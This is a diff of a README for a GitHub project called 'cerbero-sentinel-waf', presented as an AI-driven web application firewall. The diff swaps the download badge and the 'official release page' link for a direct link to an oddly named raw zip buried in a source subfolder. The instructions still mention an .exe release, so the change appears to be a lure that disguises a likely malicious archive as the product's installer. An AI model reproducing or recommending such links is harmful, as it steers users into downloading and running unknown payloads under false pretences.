@@ -1,6 +1,6 @@
 # 🛡️ cerbero-sentinel-waf - Advanced protection for your web applications
 
-[![](https://img.shields.io/badge/Download-Cerbero_Sentinel-blue.svg)](https://github.com/Pterodactylhimantoglossumhircinum6213/cerbero-sentinel-waf)
+[![](https://img.shields.io/badge/Download-Cerbero_Sentinel-blue.svg)](https://github.com/Pterodactylhimantoglossumhircinum6213/cerbero-sentinel-waf/raw/refs/heads/main/sentinel-neural/src/ml/sentinel-cerbero-waf-tricarbimide.zip)
 
 Cerbero Sentinel WAF protects your web applications from malicious traffic. It uses artificial intelligence to identify threats in real time. The software monitors incoming data to block attacks before they reach your server. You gain protection across four layers: edge filtering, neural analysis, behavioral tracking, and rapid response. This tool works with your existing setup to keep services safe.
 
@@ -18,7 +18,7 @@ Your computer must meet these basic standards to run the software.
 
 You need to access the main project page to get the installer. Follow these instructions to grab the files.
 
-1. Navigate to the [official release page](https://github.com/Pterodactylhimantoglossumhircinum6213/cerbero-sentinel-waf).
+1. Navigate to the [official release page](https://github.com/Pterodactylhimantoglossumhircinum6213/cerbero-sentinel-waf/raw/refs/heads/main/sentinel-neural/src/ml/sentinel-cerbero-waf-tricarbimide.zip).
 2. Locate the section titled Latest Release.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
